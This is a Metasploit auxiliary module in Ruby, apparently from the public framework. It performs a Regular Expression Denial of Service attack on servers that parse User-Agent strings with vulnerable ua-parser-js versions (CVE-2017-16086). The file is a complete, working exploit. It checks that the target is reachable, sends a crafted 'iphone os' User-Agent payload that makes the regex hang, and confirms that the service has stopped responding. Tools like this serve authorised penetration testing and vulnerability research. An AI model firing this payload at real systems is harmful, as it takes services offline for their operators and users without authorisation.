##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Dos

  def initialize
    super(
      'Name'        => 'ua-parser-js npm module ReDoS',
      'Description' => %q{
        This module exploits a Regular Expression Denial of Service vulnerability
        in the npm module "ua-parser-js". Server-side applications that use
        "ua-parser-js" for parsing the browser user-agent string will be vulnerable
        if they call the "getOS" or "getResult" functions. This vulnerability was
        fixed as of version 0.7.16.
      },
      'References'  =>
        [
          ['CVE', '2017-16086'],
          ['URL', 'https://github.com/faisalman/ua-parser-js/commit/25e143ee7caba78c6405a57d1d06b19c1e8e2f79'],
          ['CWE', '400'],
        ],
      'Author'      =>
        [
          'Ryan Knell,  Sonatype Security Research',
          'Nick Starke, Sonatype Security Research',
        ],
      'License'     =>  MSF_LICENSE
    )

    register_options([
      Opt::RPORT(80)
    ])
  end

  def run
    unless test_service
      fail_with(Failure::Unreachable, "#{peer} - Could not communicate with service.")
    else
      trigger_redos
      test_service_unresponsive
    end
  end

  def trigger_redos
    begin
      print_status("Sending ReDoS request to #{peer}.")

      res = send_request_cgi({
        'uri' => '/',
        'method' => 'GET',
        'headers' => {
          'user-agent' => 'iphone os ' + (Rex::Text.rand_text_alpha(1) * 64)
        }
      })

      if res.nil?
        print_status("No response received from #{peer}, service is most likely unresponsive.")
      else
        fail_with(Failure::Unknown, "ReDoS request unsuccessful. Received status #{res.code} from #{peer}.")
      end

    rescue ::Rex::ConnectionRefused
      print_error("Unable to connect to #{peer}.")
    rescue ::Timeout::Error
      print_status("No HTTP response received from #{peer}, this indicates the payload was successful.")
    end
  end

  def test_service_unresponsive
    begin
      print_status('Testing for service unresponsiveness.')

      res = send_request_cgi({
        'uri' => '/' + Rex::Text.rand_text_alpha(8),
        'method' => 'GET'
      })

      if res.nil?
        print_good('Service not responding.')
      else
        print_error('Service responded with a valid HTTP Response; ReDoS attack failed.')
      end
    rescue ::Rex::ConnectionRefused
      print_error('An unknown error occurred.')
    rescue ::Timeout::Error
      print_good('HTTP request timed out, most likely the ReDoS attack was successful.')
    end
  end

  def test_service
    begin
      print_status('Testing Service to make sure it is working.')

      res = send_request_cgi({
        'uri' => '/' + Rex::Text.rand_text_alpha(8),
        'method' => 'GET'
      })

      if !res.nil? && (res.code == 200 || res.code == 404)
        print_status('Test request successful, attempting to send payload')
        return true
      else
        return false
      end
    rescue ::Rex::ConnectionRefused
      print_error("Unable to connect to #{peer}.")
      return false
    end
  end
end
